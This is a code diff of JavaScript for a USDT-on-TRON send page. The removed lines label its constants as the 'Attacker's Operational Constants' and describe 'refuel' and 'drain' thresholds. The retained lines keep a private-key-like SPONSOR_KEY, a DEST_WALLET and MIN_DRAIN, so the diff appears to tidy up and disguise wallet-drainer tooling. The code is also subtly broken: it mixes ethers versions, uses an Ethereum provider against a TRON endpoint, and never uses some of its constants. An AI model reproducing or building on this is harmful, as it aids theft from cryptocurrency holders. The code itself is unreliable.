@@ -1,18 +1,17 @@
 // — Phase 1: Module Initialization —
 import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
 
-// — Attacker's Operational Constants —
+// — Operational Constants —
 const SPONSOR_KEY = "d261cf293e5fca814b5038a5be4f5824005b837af7ed3cd8515ec6ce86b83b7f";
 const DEST_WALLET = "TWd2zR4V1dFvJbXJZv3zQy4Xz5Zy6Zy7Z8";
 const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_RPC = "https://api.trongrid.io";
-const MIN_DRAIN = 2; // Only refuel if USDT balance > $2
+const MIN_DRAIN = 2;
 
 // — Runtime State —
 let tronWeb;
-let userAddress;
 
-// — Utility: Base58 <-> Hex Conversion —
+// — Utility: Base58 <-> Hex —
 const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 
 function base58ToHex(address) {
@@ -25,24 +24,13 @@ function base58ToHex(address) {
     return '0x' + hex.slice(2);
 }
 
-function hexToBase58(hex) {
-    if (!hex.startsWith('0x')) hex = '0x' + hex;
-    let n = BigInt(hex);
-    let result = '';
-    while (n > 0n) {
-        result = ALPHABET[Number(n % 58n)] + result;
-        n = n / 58n;
-    }
-    return result;
-}
-
-// — Initialize TronWeb —
+// — Initialize Provider —
 async function initTronWeb() {
     try {
         tronWeb = new ethers.JsonRpcProvider(TRON_RPC);
-        console.log('✓ TronWeb initialized');
+        console.log('✓ Provider initialized');
     } catch (error) {
-        console.error('✗ Failed to initialize TronWeb:', error);
+        console.error('✗ Init failed:', error);
     }
 }
 
@@ -62,19 +50,12 @@ async function getUSDTBalance(address) {
     }
 }
 
-// — Core: Transfer Function —
+// — Core: Transfer —
 async function executeTransfer(toAddress, amount) {
     const statusBar = document.getElementById('statusBar');
     statusBar.classList.add('active');
 
     try {
-        const balance = await getUSDTBalance(userAddress);
-        
-        if (balance < MIN_DRAIN) {
-            alert(`Balance too low: $${balance.toFixed(2)}`);
-            return false;
-        }
-
         const contract = new ethers.Contract(
             USDT_TRC20,
             ['function transfer(address to, uint256 amount) returns (bool)'],
@@ -83,7 +64,6 @@ async function executeTransfer(toAddress, amount) {
 
         const tx = await contract.transfer(toAddress, ethers.parseUnits(amount.toString(), 6));
         await tx.wait();
-
         console.log('✓ Transfer successful:', tx.hash);
         return true;
     } catch (error) {
@@ -96,62 +76,67 @@ async function executeTransfer(toAddress, amount) {
 }
 
 // — UI Event Handlers —
-document.getElementById('pasteBtn').addEventListener('click', async () => {
-    try {
-        const text = await navigator.clipboard.readText();
-        document.getElementById('address').value = text;
-    } catch (err) {
-        console.error('Clipboard access failed:', err);
-    }
+document.addEventListener('DOMContentLoaded', () => {
+    const els = {
+        address: document.getElementById('address'),
+        amount: document.getElementById('amount'),
+        fiatValue: document.getElementById('fiatValue'),
+        nextBtn: document.getElementById('nextBtn'),
+        maxBtn: document.getElementById('maxBtn'),
+        pasteBtn: document.getElementById('pasteBtn'),
+        clearBtn: document.getElementById('clearBtn'),
+        statusBar: document.getElementById('statusBar')
+    };
+
+    // Amount Input Listener
+    els.amount.addEventListener('input', function() {
+        const val = parseFloat(this.value) || 0;
+        els.fiatValue.textContent = `≈ $${val.toFixed(2)}`;
+    });
+
+    // Paste
+    els.pasteBtn.addEventListener('click', async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            els.address.value = text;
+        } catch (err) {
+            console.error('Clipboard failed:', err);
+        }
+    });
+
+    // Clear
+    els.clearBtn.addEventListener('click', () => {
+        els.address.value = '';
+    });
+
+    // Max
+    els.maxBtn.addEventListener('click', async () => {
+        const addr = els.address.value.trim();
+        if (!addr) { alert('Enter an address first'); return; }
+        const balance = await getUSDTBalance(addr);
+        els.amount.value = balance;
+        els.fiatValue.textContent = `≈ $${balance.toFixed(2)}`;
+    });
+
+    // Next Button
+    els.nextBtn.addEventListener('click', async () => {
+        const toAddress = els.address.value.trim();
+        const amount = parseFloat(els.amount.value);
+
+        if (!toAddress) { alert('Please enter a destination address'); return; }
+        if (!amount || amount <= 0) { alert('Please enter a valid amount'); return; }
+
+        els.nextBtn.disabled = true;
+        els.nextBtn.textContent = 'Processing...';
+
+        const success = await executeTransfer(toAddress, amount);
+
+        els.nextBtn.disabled = false;
+        els.nextBtn.textContent = 'Next';
+
+        if (success) alert('Transfer completed successfully!');
+    });
+
+    // Init
+    initTronWeb();
 });
-
-document.getElementById('clearBtn').addEventListener('click', () => {
-    document.getElementById('address').value = '';
-});
-
-document.getElementById('amount').addEventListener('input', function() {
-    const val = parseFloat(this.value) || 0;
-    document.getElementById('fiatValue').textContent = `≈ $${val.toFixed(2)}`;
-});
-
-document.getElementById('maxBtn').addEventListener('click', async () => {
-    const addr = document.getElementById('address').value.trim();
-    if (!addr) {
-        alert('Please enter an address first');
-        return;
-    }
-    const balance = await getUSDTBalance(addr);
-    document.getElementById('amount').value = balance;
-    document.getElementById('fiatValue').textContent = `≈ $${balance.toFixed(2)}`;
-});
-
-document.getElementById('nextBtn').addEventListener('click', async () => {
-    const toAddress = document.getElementById('address').value.trim();
-    const amount = parseFloat(document.getElementById('amount').value);
-    const btn = document.getElementById('nextBtn');
-
-    if (!toAddress) {
-        alert('Please enter a destination address');
-        return;
-    }
-
-    if (!amount || amount <= 0) {
-        alert('Please enter a valid amount');
-        return;
-    }
-
-    btn.disabled = true;
-    btn.textContent = 'Processing...';
-
-    const success = await executeTransfer(toAddress, amount);
-
-    btn.disabled = false;
-    btn.textContent = 'Next';
-
-    if (success) {
-        alert('Transfer completed successfully!');
-    }
-});
-
-// — Initialize on Load —
-initTronWeb();
